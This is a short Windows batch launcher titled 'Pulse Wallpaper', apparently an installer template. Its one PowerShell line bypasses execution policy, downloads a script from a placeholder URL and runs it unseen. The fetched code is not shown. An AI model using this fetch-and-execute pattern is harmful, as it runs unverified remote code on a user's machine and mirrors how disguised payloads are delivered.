@echo off
title Pulse Wallpaper
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "irm '{{INSTALL_URL}}' | iex"
echo.
pause
